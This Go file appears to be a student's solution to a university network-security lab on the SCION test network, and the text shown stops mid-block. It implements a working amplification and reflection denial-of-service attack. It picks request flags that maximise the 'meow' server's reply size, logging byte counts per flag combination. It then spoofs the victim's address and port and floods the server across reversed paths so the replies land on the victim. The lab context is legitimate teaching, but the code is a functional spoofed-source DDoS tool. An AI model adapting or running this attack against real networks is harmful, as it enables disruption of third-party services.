package client

import (
	// All of these imports were used for the mastersolution
	"encoding/json"
	"fmt"
	"log"
//	"sync"
	"context"
	"time"
//	"ethz.ch/netsec/isl/handout/attack/server"
	"github.com/scionproto/scion/go/lib/snet"
	"github.com/scionproto/scion/go/lib/addr"
	"github.com/scionproto/scion/go/lib/daemon"
	"github.com/scionproto/scion/go/lib/sock/reliable"
	"net" //locally not used
//	"github.com/scionproto/scion/go/lib/spath" //locally not used
)

//////////////////////////////public.go//////////////////////////////

///*
//// meow
//*/
const MaxBufferSize = 8192

//var ServerPorts
var ServerPorts []uint64 = []uint64{8090, 8091}

// Supported Queries
type Query string

const (
	First  Query = "1"
	Second Query = "2"
	Third  Query = "3"
)

// Message format
type RequestHeader struct {
	Id int64
	F  Flags
}

type RequestBody struct {
	Query Query
}

type request struct {
	H RequestHeader
	B RequestBody
}

type Flags struct {
	H bool
	V bool
	M bool
	D bool
}

// The meow server will always answer with a string

// Constructor for Request
func NewRequest(q Query, flags ...bool) *JsonRequest {
	if len(flags) > 4 {
		log.Fatalf("Too many flags!")
		//logging.Fatalf("Too many flags!")
	}
	var f = Flags{}
	for i, flag := range flags {
		switch i {
		case 0:
			f.H = flag
		case 1:
			f.V = flag
		case 2:
			f.M = flag
		case 3:
			f.D = flag
		}
	}
	header := RequestHeader{
		Id: -1,
		F:  f,
	}
	body := RequestBody{
		Query: q,
	}
	internalRequest := request{
		H: header,
		B: body,
	}
	answ := JsonRequest{
		jsonD: internalRequest,
	}
	return &answ
}

// Setter
func SetID(id int64) func(r *JsonRequest) {
	return func(r *JsonRequest) {
		r.jsonD.H.Id = id
	}
}

// Getters
func (r *JsonRequest) ID() int64 {
	return r.jsonD.H.Id
}

func (r *JsonRequest) Flags() Flags {
	return r.jsonD.H.F
}

func (r *JsonRequest) Query() Query {
	return r.jsonD.B.Query
}

// Serialization
type JsonRequest struct {
	jsonD request
}

func (jr *JsonRequest) MarshalJSON() ([]byte, error) {
	return json.Marshal(&request{
		H: jr.jsonD.H,
		B: jr.jsonD.B,
	})
}

//////////////////////////////public.go//////////////////////////////

//SERVER: Packet received: bytes=122, from=17-ffaa:0:1119,10.57.109.132, to=17-ffaa:0:1119,10.57.109.162
//SERVER: Path of the packet: { Empty (0)}
//SERVER: # of Bytes answer:
//SERVER: 145
//SERVER: Packet written:
// bytes=145 to=17-ffaa:0:1119,10.57.109.132
// from=17-ffaa:0:1119,10.57.109.162

func GenerateAttackPayload() []byte {
	// TODO: Amplification Task
	
	var q Query = "0"
	// Use API to build request
	//server.First
	//true, true, true, true -> 28 bytes
	//true, true, true, false -> 28 bytes
	//false, false, false, true -> 172 bytes
	//false, false, true, true -> 238 bytes
	//false, true, true, true -> 295 bytes
	
	//second
	//false, true, true, true -> 404 bytes
	
	//third
	//false, true, true, true -> 399 bytes
	
	request := NewRequest(q, false, true, true, true)
	//server.SetID(1)(request)
	// serialize the request with the API Marshal function
	d, err := request.MarshalJSON()
	if err != nil {
		fmt.Println(err)
		return make([]byte, 0) // empty paiload on fail
	}
	return d
//	request := NewRequest("424242424242424242424242", true, true, true, false)
//	
//	fmt.Println("GenerateAttackPayload: ")
//	payload, err := json.Marshal(request)
//	if err != nil {
//		fmt.Println("err: ", err)
//		log.Fatal(err)
//		payload = make([]byte, 0) //no payload
//	}
//	
//	fmt.Println("payload: ", payload)
//	return payload
}

/*
victim_port: 61210
student_subnet: 10.57.109.128/25
default_subnet: 10.57.109.128/28
wireguard_ip: 10.57.109.129
sciond_ip: 10.57.109.131
client_subnet: 10.57.109.144/28
server_subnet: 10.57.109.160/28
default_server_veth_ip: 10.57.109.161
default_client_veth_ip: 10.57.109.145
server_bridge_ip: 10.57.109.162
client_bridge_ip: 10.57.109.146
monitor_ip: 10.57.109.130
local_victim_ip: 10.57.109.132
prometheus_ip: 127.0.0.1
customer_ip: 10.57.109.133
*/

/*
local victim: 10.57.109.132:61210
local meow: 10.57.109.162:8091; 10.57.109.162:8090 
*/

/*
sudo tshark -i meow -Y 'scion.src_isd == 17 && scion.src_as == "ffaa:0:1115"'
sudo tshark -i meow -Y 'scion'
IP address for enp0s3: 10.0.2.15
IP address for wg0:    10.57.109.129
IP address for meow:   10.57.109.161
IP address for attack: 10.57.109.145
*/

func local_attack(ctx context.Context, meowServerAddr string, spoofedAddr *snet.UDPAddr, payload []byte) (err error) {
	//LOCAL
	// The following objects might be useful and you may use them in your solution,
	// but you don't HAVE to use them to solve the task.

	// Context
	ctx, cancel := context.WithTimeout(context.Background(), 1*time.Second)
	defer cancel()
	
	meow_ServerAddr, err := snet.ParseUDPAddr(meowServerAddr) //&UDPAddr{IA: ia, Host: udp}, nil
	if err != nil {
		log.Fatal(err)
	}
	
	fmt.Println("meowServerAddr: ", meowServerAddr)
	fmt.Println("meow_ServerAddr: ", meow_ServerAddr)
	fmt.Println("meow_ServerAddr: ", meow_ServerAddr)
	fmt.Println("spoofedAddr: ", spoofedAddr)
	fmt.Println("payload: ", payload)
	fmt.Println("len(payload): ", len(payload))
	// Here we initialize handles to the scion daemon and dispatcher running in the namespaces

	// SCION dispatcher
	
	dispSockPath, err := DispatcherSocket()
	if err != nil {
		log.Fatal(err)
	}
	dispatcher := reliable.NewDispatcher(dispSockPath)
//	Clients should either call:
//	Dial, if they do not want to register a receiving address with the remote end
//		(e.g., when connecting to SCIOND);
//	type Dispatcher interface {
//		// Register connects to a SCION Dispatcher's UNIX socket. Future messages for the address in AS
//		// ia which arrive at the dispatcher can be read by calling Read on the returned connection.
//		Register(ctx context.Context, ia addr.IA, address *net.UDPAddr,
//			svc addr.HostSVC) (net.PacketConn, uint16, error)
//	}

	// SCION daemon
	sciondAddr := SCIONDAddress()
//	sciondAddr, err := SCIONDAddress()
//	if err != nil {
//		log.Fatal(err)
//	}
	
	//https://github.com/scionproto/scion/blob/master/pkg/daemon/daemon.go
	//https://github.com/scionproto/scion/blob/3efcbef6695762d46e834d4a68e138709cc4ebd4/pkg/daemon/grpc.go#L40
	//https://github.com/scionproto/scion/blob/3efcbef6695762d46e834d4a68e138709cc4ebd4/pkg/daemon/daemon.go#L64
	
	// Connector implements the Dataplane API of the router control process. It sets
	// up connections for the DataPlane.
//	type Connector struct {
//		DataPlane DataPlane
//
//		ia                 addr.IA
//		mtx                sync.Mutex
//		internalInterfaces []control.InternalInterface
//		externalInterfaces map[uint16]control.ExternalInterface
//		siblingInterfaces  map[uint16]control.SiblingInterface
//	}
	
//	NewNetwork creates a new networking context, on which future Dial or Listen calls can be made. 
//	The new connections use the SCIOND server at sciondPath, the dispatcher at dispatcherPath, and ia for the local ISD-AS.
//
//	If sciondPath is the empty string, the network will run without SCIOND. 
//	In this mode of operation, the app is fully responsible with supplying paths for sent traffic.	
	
	sciondConn, err := daemon.NewService(sciondAddr).Connect(ctx)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("sciondAddr: ", sciondAddr)

//	type PathReqFlags struct {
//		Refresh bool
//		Hidden  bool
//	}
		
// Paths(ctx context.Context, dst, src addr.IA, f PathReqFlags) ([]snet.Path, error)
// Paths requests from the daemon a set of end to end paths between the source and destination.
		
	//Path
	flags := daemon.PathReqFlags{false, false}
	path_array, err := sciondConn.Paths(ctx, spoofedAddr.IA, meow_ServerAddr.IA, flags) // ([]snet.Path, error)
	if err != nil {
		log.Fatal(err)
	}
	len_path_array := len(path_array)
	
	fmt.Println("path_array: ", path_array)
	fmt.Println("len_path_array: ", len_path_array)
	
	//https://github.com/scionproto/scion/blob/3efcbef6695762d46e834d4a68e138709cc4ebd4/pkg/daemon/daemon.go#L64
	// LocalIA requests from the daemon the local ISD-AS number.
	localIA, err := sciondConn.LocalIA(ctx) // (addr.IA, error)	
	if err != nil {
		log.Fatal(err)
	}
	
	//https://pkg.go.dev/github.com/netsec-ethz/scion/go/lib/snet#NewNetwork
	//https://github.com/netsec-ethz/scion/blob/v0.4.0/go/lib/snet/snet.go#L101
	//Debugger says 1 return value
	
	//https://pkg.go.dev/github.com/netsec-ethz/scion/go/lib/snet#NewNetwork
	//https://github.com/netsec-ethz/scion/blob/v0.4.0/go/lib/snet/snet.go#L144
//	scionNetwork, err := snet.NewNetwork(localIA, "", dispatcher) //(*SCIONNetwork, error)
//	if err != nil {
//		log.Fatal(err)
//	}
	
	//local
	scionNetwork := snet.NewNetwork(localIA, dispatcher, nil) //(*SCIONNetwork, error)
	
	//https://pkg.go.dev/net#UDPAddr
//	type UDPAddr struct {
//		IP   IP
//		Port int
//		Zone string // IPv6 scoped addressing zone
//	}
	
	//https://github.com/netsec-ethz/scion/blob/scionlab/go/lib/snet/udpaddr.go
	// snet.UDPAddr to be used when UDP host.
//	type UDPAddr struct {
//		IA      addr.IA
//		Path    DataplanePath
//		NextHop *net.UDPAddr
//		Host    *net.UDPAddr
//	}
	
	network := "udp" 
	//10.57.109.132:61210
	//src_net_udp_address := &net.UDPAddr{net.IPv4(10, 57, 109, 132), 61210}
		
	scion_connection, err := scionNetwork.Dial(ctx, network, spoofedAddr.Host, meow_ServerAddr, addr.SvcNone) //(*Conn, error)
	if err != nil {
		log.Fatal(err)
	}
	
	//https://github.com/netsec-ethz/scion/blob/scionlab/go/lib/snet/conn.go
	defer scion_connection.Close()
	
//	scionpacketconn := snet.NewSCIONPacketConn(scion_connection, nil, false)
//	scionpacketconn.Close()

	// TODO: Reflection Task
	// Set up a scion connection with the meow-server
	// and spoof the return address to reflect to the victim.
	// Don't forget to set the spoofed source port with your
	// personalized port to get feedback from the victims.
	attackDuration := AttackDuration()
	for start := time.Now(); time.Since(start) < attackDuration; {
		_, err := scion_connection.Write(payload)
		if err != nil {
			log.Fatal(err)
		}
		//fmt.Println("payload_size: ", payload_size)
	}
	return nil
}

func remote_attack(ctx context.Context, meowServerAddr string, spoofedAddr *snet.UDPAddr, payload []byte) (err error) {
	//REMOTE
	// The following objects might be useful and you may use them in your solution,
	// but you don't HAVE to use them to solve the task.
	
	// Context
	ctx, cancel := context.WithTimeout(context.Background(), 1*time.Second)
	defer cancel()
	
	meow_ServerAddr, err := snet.ParseUDPAddr(meowServerAddr) //&UDPAddr{IA: ia, Host: udp}, nil
	if err != nil {
		log.Fatal(err)
	}
	
	fmt.Println("meowServerAddr: ", meowServerAddr)
	fmt.Println("meow_ServerAddr: ", meow_ServerAddr)
	fmt.Println("meow_ServerAddr: ", meow_ServerAddr)
	fmt.Println("spoofedAddr: ", spoofedAddr)
	fmt.Println("payload: ", payload)
	fmt.Println("len(payload): ", len(payload))
	// Here we initialize handles to the scion daemon and dispatcher running in the namespaces

	// SCION dispatcher
	
	dispSockPath, err := DispatcherSocket()
	if err != nil {
		log.Fatal(err)
	}
	dispatcher := reliable.NewDispatcher(dispSockPath)
	

	// SCION daemon
	sciondAddr := SCIONDAddress()
//	sciondAddr, err := SCIONDAddress()
//	if err != nil {
//		log.Fatal(err)
//	}

	sciondConn, err := daemon.NewService(sciondAddr).Connect(ctx)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("sciondAddr: ", sciondAddr)
	
	
	//Path
	flags := daemon.PathReqFlags{false, false}
	path_array, err := sciondConn.Paths(ctx, spoofedAddr.IA, meow_ServerAddr.IA, flags) // ([]snet.Path, error)
	if err != nil {
		log.Fatal(err)
	}
	len_path_array := len(path_array)
	
	fmt.Println("path_array: ", path_array)
	fmt.Println("len_path_array: ", len_path_array)
	
//	mapping_index_2_spath map[int]*spath.Path = make(map[int]*spath.Path)
//			
//	for path_element_i := 0; path_element_i < len_path_array; path_element_i++ {
//		//debug
//		fmt.Println("path_element_i: ", path_array[path_element_i])
//		temp_var := path_array[path_element_i]
//		temp_var = temp_var.Path()
//		temp_var = temp_var.Reverse()
//		mapping_index_2_spath[path_element_i] = temp_var
//	}
	
	fmt.Println("----")
		
//	type Packet struct {
//		Bytes
//		PacketInfo
//	}
	
//	type PacketInfo struct {
//		// Destination contains the destination address.
//		Destination SCIONAddress
//		// Source contains the source address. If it is an SVC address, packet
//		// serialization will return an error.
//		Source SCIONAddress
//		// Path contains a SCION forwarding path. This field must not be nil.
//		Path DataplanePath
//		// Payload is the Payload of the message.
//		Payload Payload
//	}
	
//	type SCIONAddress struct {
//		IA   addr.IA
//		Host addr.HostAddr
//	}
	
	
	
	//https://pkg.go.dev/github.com/scionproto/scion/go/lib/snet#Packet
	//https://pkg.go.dev/github.com/scionproto/scion/go/lib/snet#Bytes -> Most callers can safely ignore it.
	//https://pkg.go.dev/github.com/scionproto/scion/go/lib/snet#PacketInfo
	//https://pkg.go.dev/github.com/scionproto/scion@v0.7.0/go/lib/addr#HostAddr
	//https://github.com/scionproto/scion/blob/v0.7.0/go/lib/snet/packet.go#L36 UDP PAYLOAD
	
	// UDPPayload is a simple UDP payload.
//	type UDPPayload struct {
//		SrcPort, DstPort uint16
//		Payload          []byte
//	}
	
//	packet_bytes := nil
	
	packet_dest := snet.SCIONAddress{IA: meow_ServerAddr.IA, Host: addr.HostFromIP(MeowServerIP())}
	packet_src := snet.SCIONAddress{IA: spoofedAddr.IA, Host: addr.HostFromIP(RemoteVictimIP())}
	
	//https://github.com/scionproto/scion/blob/v0.7.0/go/lib/snet/udpaddr.go
	// UDPAddr to be used when UDP host.
//	type UDPAddr struct {
//		IA      addr.IA
//		Path    DataplanePath
//		NextHop *net.UDPAddr
//		Host    *net.UDPAddr
//	}
	
	udp_payload := snet.UDPPayload{SrcPort: uint16(VictimPort()), DstPort: uint16(meow_ServerAddr.Host.Port), Payload: payload} //spoofedAddr.Host.Port, 
	
	mapping_index_2_packet := make(map[int]*snet.Packet)
	
	//clog victim by sending packets through different potential paths		
	for path_element_i := 0; path_element_i < len_path_array; path_element_i++ {
		//debug
		fmt.Println("path_element_i: ", path_array[path_element_i])
		temp_var1 := path_array[path_element_i]
		temp_var2 := temp_var1.Path()
		temp_var2.Reverse()
		
		packet_info := snet.PacketInfo{Destination: packet_dest, Source: packet_src, Path: temp_var2, Payload: udp_payload}
		packet := &snet.Packet{Bytes: nil, PacketInfo: packet_info}
		
		mapping_index_2_packet[path_element_i] = packet
	}
	
	//https://pkg.go.dev/github.com/scionproto/scion/go/lib/snet#DefaultPacketDispatcherService
//	type DefaultPacketDispatcherService struct {
//		// Dispatcher is used to get packets from the local SCION Dispatcher process.
//		Dispatcher reliable.Dispatcher
//		// SCMPHandler is invoked for packets that contain an SCMP L4. If the
//		// handler is nil, errors are returned back to applications every time an
//		// SCMP message is received.
//		SCMPHandler SCMPHandler
//		// Metrics injected into SCIONPacketConn.
//		SCIONPacketConnMetrics SCIONPacketConnMetrics
//	}
	//https://github.com/netsec-ethz/scion/blob/9539ce22fcc3c263d824d476e8d2e516c7edac41/go/lib/snet/dispatcher.go#L55
	
	// LocalIA requests from the daemon the local ISD-AS number.
	localIA, err := sciondConn.LocalIA(ctx) // (addr.IA, error)	
	if err != nil {
		log.Fatal(err)
	}
	
	default_packet_dispatcher_service := snet.DefaultPacketDispatcherService{Dispatcher: dispatcher, SCMPHandler: nil}
	packet_connector, portnumber, err := default_packet_dispatcher_service.Register(ctx, localIA, spoofedAddr.Host, addr.SvcNone)//(PacketConn, uint16, error)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("Portnumber:", portnumber)//victim_port: 61210
	
	
	//https://github.com/scionproto/scion/blob/v0.7.0/go/lib/snet/packet_conn.go#L135
	ov := &net.UDPAddr{IP: MeowServerIP(), Port: DispatcherPort(), Zone: ""}
	attackDuration := AttackDuration()
	
	packet_index := 0
	for start := time.Now(); time.Since(start) < attackDuration; {
		err := packet_connector.WriteTo(mapping_index_2_packet[packet_index], ov)
		if err != nil {
			log.Fatal(err)
		}
		packet_index = (packet_index + 1) % len_path_array
	}
	
	return nil
	
	
	
	//https://pkg.go.dev/github.com/netsec-ethz/scion/go/lib/snet#NewNetwork
	//https://github.com/netsec-ethz/scion/blob/v0.4.0/go/lib/snet/snet.go#L101
	//Debugger says 1 return value





	
//	//remote
//	scionNetwork := snet.NewNetwork(spoofedAddr.IA, dispatcher, nil) //(*SCIONNetwork, error)
	
	
	
	//https://pkg.go.dev/net#UDPAddr
//	type UDPAddr struct {
//		IP   IP
//		Port int
//		Zone string // IPv6 scoped addressing zone
//	}
	
	//https://github.com/netsec-ethz/scion/blob/scionlab/go/lib/snet/udpaddr.go
	// snet.UDPAddr to be used when UDP host.
//	type UDPAddr struct {
//		IA      addr.IA
//		Path    DataplanePath
//		NextHop *net.UDPAddr
//		Host    *net.UDPAddr
//	}
	
//	network := "udp" 
	//10.57.109.132:61210
	//src_net_udp_address := &net.UDPAddr{net.IPv4(10, 57, 109, 132), 61210}
	
	//remote
//	fmt.Println("path_array[0]: ", path_array[1])
//	path_0 := path_array[1]
//	temp_var := path_0.Path()
//	fmt.Println("path_array[0].Path(): ", temp_var)
//	temp_var.Reverse()
//	fmt.Println("path_array[0].Path().Reverse(): ", temp_var)
//	meow_ServerAddr.Path = temp_var
//	spoofing := &net.UDPAddr{IP: meow_ServerAddr.Host.IP, Port: DispatcherPort(), Zone: ""}
//	meow_ServerAddr.NextHop = spoofing
		
//	scion_connection0, err := scionNetwork.Dial(ctx, network, spoofedAddr.Host, meow_ServerAddr, addr.SvcNone) //(*Conn, error)
//	if err != nil {
//		log.Fatal(err)
//	}
//	
//	//https://github.com/netsec-ethz/scion/blob/scionlab/go/lib/snet/conn.go
//		
//	defer scion_connection0.Close()
	
	
	
//	fmt.Println("path_array[1]: ", path_array[1])
//	path_1 := path_array[1]
//	temp_var = path_1.Path()
//	fmt.Println("path_array[1].Path(): ", temp_var)
//	temp_var.Reverse()
//	fmt.Println("path_array[1].Path().Reverse(): ", temp_var)
//	meow_ServerAddr.Path = temp_var
//	spoofing = &net.UDPAddr{IP: meow_ServerAddr.Host.IP, Port: DispatcherPort(), Zone: ""}
//	meow_ServerAddr.NextHop = spoofing
//		
//	scion_connection1, err := scionNetwork.Dial(ctx, network, spoofedAddr.Host, meow_ServerAddr, addr.SvcNone) //(*Conn, error)
//	if err != nil {
//		log.Fatal(err)
//	}
//	
//	//https://github.com/netsec-ethz/scion/blob/scionlab/go/lib/snet/conn.go
//	defer scion_connection1.Close()

	// TODO: Reflection Task
	// Set up a scion connection with the meow-server
	// and spoof the return address to reflect to the victim.
	// Don't forget to set the spoofed source port with your
	// personalized port to get feedback from the victims.
//	attackDuration := AttackDuration()
//	for start := time.Now(); time.Since(start) < attackDuration; {
//		_, err := scion_connection0.Write(payload)
//		if err != nil {
//			log.Fatal(err)
//		}
////		_, err = scion_connection1.Write(payload)
////		if err != nil {
////			log.Fatal(err)
////		}
//		//fmt.Println("payload_size: ", payload_size)
//	}
//	return nil	
}


func Attack(ctx context.Context, meowServerAddr string, spoofedAddr *snet.UDPAddr, payload []byte) (err error) {
	
	
	
	//LOCAL
	//return local_attack(ctx, meowServerAddr, spoofedAddr, payload)
	
	//REMOTE
//	return remote_attack(ctx, meowServerAddr, spoofedAddr, payload)
	
	meow_ServerAddr, err := snet.ParseUDPAddr(meowServerAddr) //&UDPAddr{IA: ia, Host: udp}, nil
	if err != nil {
		log.Fatal(err)
	}
	
	//observe: the local victim has same IA value as the meow
	if remote := (meow_ServerAddr.IA != spoofedAddr.IA); remote { //if equal, then remote is false (local case); if not equal, then remote is true (remote case)
		return remote_attack(ctx, meowServerAddr, spoofedAddr, payload)
	}
	
	return local_attack(ctx, meowServerAddr, spoofedAddr, payload)

	//https://github.com/netsec-ethz/scion-apps/blob/master/pkg/pan/addr.go
	// ParseUDPAddr converts an address string to a SCION address.
//	func ParseUDPAddr(s string) (UDPAddr, error) {
		
	// parseSCIONAddr converts an SCION address string to a SCION address.
	//func parseSCIONAddr(address string) (scionAddr, error) {
		
	// SplitHostPort splits a host:port string into host and port variables.
	// This is analogous to net.SplitHostPort, which however refuses to handle SCION addresses.
	// The address can be of the form of a SCION address (i.e. of the form "ISD-AS,[IP]:port")
	// or in the form of "hostname:port".
	//func SplitHostPort(hostport string) (host, port string, err error) {
		
	//https://github.com/netsec-ethz/scion-apps/blob/master/pkg/pan/udp_dial.go
	// DialUDP looks up SCION paths to the destination AS. The policy defines the
	// allowed paths and their preference order. The selector dynamically selects
	// a path among this set for each Write operation.
	// If the policy is nil, all paths are allowed.
	// If the selector is nil, a DefaultSelector is used.
	//func DialUDP(ctx context.Context, local netaddr.IPPort, remote UDPAddr,
	
	
	
	// Dial returns a SCION connection to remote. Nil values for listen are not
	// supported yet. Parameter network must be "udp". The returned connection's
	// Read and Write methods can be used to receive and send SCION packets.
	// Remote address requires a path and the underlay net hop to be set if the
	// destination is in a remote AS.
	//
	// The context is used for connection setup, it doesn't affect the returned
	// connection.
	// func (n *SCIONNetwork) Dial(ctx context.Context, network string, listen *net.UDPAddr,
	// remote *UDPAddr, svc addr.HostSVC) (*Conn, error) {
	
//	serverAddr, err := pan.ParseUDPAddr(serverAddrPort)
//		if err != nil {
//			log.Fatal(err)
//		}
//		conn, err := pan.DialUDP(ctx, netaddr.IPPort{}, serverAddr, nil, nil)
//		if err != nil {
//			fmt.Println("CLIENT: Dial produced an error.", err)
//			return
//		}
//		defer conn.Close()
//		n, err := conn.Write(payload)
//		if err != nil {
//			fmt.Println("CLIENT: Write produced an error.", err)
//			return
//		}
		
//https://github.com/scionproto/scion/blob/master/pkg/snet/snet.go
//conn_ptr, err := snet.Dial(ctx, network, listen *net.UDPAddr, remote *UDPAddr, svc addr.HostSVC)
		
//	snet.UDPAddr
//	// UDPAddr is an address for a SCION/UDP end point.
//	type UDPAddr struct {
//		IA   IA
//		IP   netaddr.IP
//		Port uint16
//	}	
	
//	//LOCAL
//	// The following objects might be useful and you may use them in your solution,
//	// but you don't HAVE to use them to solve the task.
//
//	// Context
//	ctx, cancel := context.WithTimeout(context.Background(), 1*time.Second)
//	defer cancel()
//	
//	meow_ServerAddr, err := snet.ParseUDPAddr(meowServerAddr) //&UDPAddr{IA: ia, Host: udp}, nil
//	if err != nil {
//		log.Fatal(err)
//	}
//	
//	fmt.Println("meowServerAddr: ", meowServerAddr)
//	fmt.Println("meow_ServerAddr: ", meow_ServerAddr)
//	fmt.Println("meow_ServerAddr: ", meow_ServerAddr)
//	fmt.Println("spoofedAddr: ", spoofedAddr)
//	fmt.Println("payload: ", payload)
//	fmt.Println("len(payload): ", len(payload))
//	// Here we initialize handles to the scion daemon and dispatcher running in the namespaces
//
//	// SCION dispatcher
//	
//	dispSockPath, err := DispatcherSocket()
//	if err != nil {
//		log.Fatal(err)
//	}
//	dispatcher := reliable.NewDispatcher(dispSockPath)
//	
//
//	// SCION daemon
//	sciondAddr := SCIONDAddress()
////	sciondAddr, err := SCIONDAddress()
////	if err != nil {
////		log.Fatal(err)
////	}
//	sciondConn, err := daemon.NewService(sciondAddr).Connect(ctx)
//	if err != nil {
//		log.Fatal(err)
//	}
//	fmt.Println("sciondAddr: ", sciondAddr)
//	
//	
//	//Path
//	flags := daemon.PathReqFlags{false, false}
//	path_array, err := sciondConn.Paths(ctx, spoofedAddr.IA, meow_ServerAddr.IA, flags) // ([]snet.Path, error)
//	if err != nil {
//		log.Fatal(err)
//	}
//	len_path_array := len(path_array)
//	
//	fmt.Println("path_array: ", path_array)
//	fmt.Println("len_path_array: ", len_path_array)
//		
//	// LocalIA requests from the daemon the local ISD-AS number.
//	localIA, err := sciondConn.LocalIA(ctx) // (addr.IA, error)	
//	if err != nil {
//		log.Fatal(err)
//	}
//	
//	
//	
//	
//	//https://pkg.go.dev/github.com/netsec-ethz/scion/go/lib/snet#NewNetwork
//	//https://github.com/netsec-ethz/scion/blob/v0.4.0/go/lib/snet/snet.go#L101
//	//Debugger says 1 return value
//	
//	//local
//	scionNetwork := snet.NewNetwork(localIA, dispatcher, nil) //(*SCIONNetwork, error)
//	
//	//https://pkg.go.dev/net#UDPAddr
////	type UDPAddr struct {
////		IP   IP
////		Port int
////		Zone string // IPv6 scoped addressing zone
////	}
//	
//	//https://github.com/netsec-ethz/scion/blob/scionlab/go/lib/snet/udpaddr.go
//	// snet.UDPAddr to be used when UDP host.
////	type UDPAddr struct {
////		IA      addr.IA
////		Path    DataplanePath
////		NextHop *net.UDPAddr
////		Host    *net.UDPAddr
////	}
//	
//	network := "udp" 
//	//10.57.109.132:61210
//	//src_net_udp_address := &net.UDPAddr{net.IPv4(10, 57, 109, 132), 61210}
//		
//	scion_connection, err := scionNetwork.Dial(ctx, network, spoofedAddr.Host, meow_ServerAddr, addr.SvcNone) //(*Conn, error)
//	if err != nil {
//		log.Fatal(err)
//	}
//	
//	//https://github.com/netsec-ethz/scion/blob/scionlab/go/lib/snet/conn.go
//	defer scion_connection.Close()
//	
////	scionpacketconn := snet.NewSCIONPacketConn(scion_connection, nil, false)
////	scionpacketconn.Close()
//
//	// TODO: Reflection Task
//	// Set up a scion connection with the meow-server
//	// and spoof the return address to reflect to the victim.
//	// Don't forget to set the spoofed source port with your
//	// personalized port to get feedback from the victims.
//	attackDuration := AttackDuration()
//	for start := time.Now(); time.Since(start) < attackDuration; {
//		_, err := scion_connection.Write(payload)
//		if err != nil {
//			log.Fatal(err)
//		}
//		//fmt.Println("payload_size: ", payload_size)
//	}
//	return nil
	
	
	
//	//REMOTE
//	// The following objects might be useful and you may use them in your solution,
//	// but you don't HAVE to use them to solve the task.
//
//	// Context
//	ctx, cancel := context.WithTimeout(context.Background(), 1*time.Second)
//	defer cancel()
//	
//	meow_ServerAddr, err := snet.ParseUDPAddr(meowServerAddr) //&UDPAddr{IA: ia, Host: udp}, nil
//	if err != nil {
//		log.Fatal(err)
//	}
//	
//	fmt.Println("meowServerAddr: ", meowServerAddr)
//	fmt.Println("meow_ServerAddr: ", meow_ServerAddr)
//	fmt.Println("meow_ServerAddr: ", meow_ServerAddr)
//	fmt.Println("spoofedAddr: ", spoofedAddr)
//	fmt.Println("payload: ", payload)
//	fmt.Println("len(payload): ", len(payload))
//	// Here we initialize handles to the scion daemon and dispatcher running in the namespaces
//
//	// SCION dispatcher
//	
//	dispSockPath, err := DispatcherSocket()
//	if err != nil {
//		log.Fatal(err)
//	}
//	dispatcher := reliable.NewDispatcher(dispSockPath)
//	
//
//	// SCION daemon
//	sciondAddr := SCIONDAddress()
////	sciondAddr, err := SCIONDAddress()
////	if err != nil {
////		log.Fatal(err)
////	}
//	sciondConn, err := daemon.NewService(sciondAddr).Connect(ctx)
//	if err != nil {
//		log.Fatal(err)
//	}
//	fmt.Println("sciondAddr: ", sciondAddr)
//	
//	
//	//Path
//	flags := daemon.PathReqFlags{false, false}
//	path_array, err := sciondConn.Paths(ctx, spoofedAddr.IA, meow_ServerAddr.IA, flags) // ([]snet.Path, error)
//	if err != nil {
//		log.Fatal(err)
//	}
//	len_path_array := len(path_array)
//	
//	fmt.Println("path_array: ", path_array)
//	fmt.Println("len_path_array: ", len_path_array)
//	
//			
//	for path_element_i := 0; path_element_i < len_path_array; path_element_i++ {
//		fmt.Println("path_element_i: ", path_array[path_element_i])
//	}
//	
//	fmt.Println("----")
//	
//	//https://pkg.go.dev/github.com/netsec-ethz/scion/go/lib/snet#NewNetwork
//	//https://github.com/netsec-ethz/scion/blob/v0.4.0/go/lib/snet/snet.go#L101
//	//Debugger says 1 return value
//
//	
//	//remote
//	scionNetwork := snet.NewNetwork(spoofedAddr.IA, dispatcher, nil) //(*SCIONNetwork, error)
//	
//	
//	
//	//https://pkg.go.dev/net#UDPAddr
////	type UDPAddr struct {
////		IP   IP
////		Port int
////		Zone string // IPv6 scoped addressing zone
////	}
//	
//	//https://github.com/netsec-ethz/scion/blob/scionlab/go/lib/snet/udpaddr.go
//	// snet.UDPAddr to be used when UDP host.
////	type UDPAddr struct {
////		IA      addr.IA
////		Path    DataplanePath
////		NextHop *net.UDPAddr
////		Host    *net.UDPAddr
////	}
//	
//	network := "udp" 
//	//10.57.109.132:61210
//	//src_net_udp_address := &net.UDPAddr{net.IPv4(10, 57, 109, 132), 61210}
//	
//	//remote
//	fmt.Println("path_array[0]: ", path_array[1])
//	path_0 := path_array[1]
//	temp_var := path_0.Path()
//	fmt.Println("path_array[0].Path(): ", temp_var)
//	temp_var.Reverse()
//	fmt.Println("path_array[0].Path().Reverse(): ", temp_var)
//	meow_ServerAddr.Path = temp_var
//	spoofing := &net.UDPAddr{IP: meow_ServerAddr.Host.IP, Port: DispatcherPort(), Zone: ""}
//	meow_ServerAddr.NextHop = spoofing
//		
//	scion_connection0, err := scionNetwork.Dial(ctx, network, spoofedAddr.Host, meow_ServerAddr, addr.SvcNone) //(*Conn, error)
//	if err != nil {
//		log.Fatal(err)
//	}
//	
//	//https://github.com/netsec-ethz/scion/blob/scionlab/go/lib/snet/conn.go
//		
//	defer scion_connection0.Close()
//	
//	
//	
////	fmt.Println("path_array[1]: ", path_array[1])
////	path_1 := path_array[1]
////	temp_var = path_1.Path()
////	fmt.Println("path_array[1].Path(): ", temp_var)
////	temp_var.Reverse()
////	fmt.Println("path_array[1].Path().Reverse(): ", temp_var)
////	meow_ServerAddr.Path = temp_var
////	spoofing = &net.UDPAddr{IP: meow_ServerAddr.Host.IP, Port: DispatcherPort(), Zone: ""}
////	meow_ServerAddr.NextHop = spoofing
////		
////	scion_connection1, err := scionNetwork.Dial(ctx, network, spoofedAddr.Host, meow_ServerAddr, addr.SvcNone) //(*Conn, error)
////	if err != nil {
////		log.Fatal(err)
////	}
////	
////	//https://github.com/netsec-ethz/scion/blob/scionlab/go/lib/snet/conn.go
////	defer scion_connection1.Close()
//
//	// TODO: Reflection Task
//	// Set up a scion connection with the meow-server
//	// and spoof the return address to reflect to the victim.
//	// Don't forget to set the spoofed source port with your
//	// personalized port to get feedback from the victims.
//	attackDuration := AttackDuration()
//	for start := time.Now(); time.Since(start) < attackDuration; {
//		_, err := scion_connection0.Write(payload)
//		if err != nil {
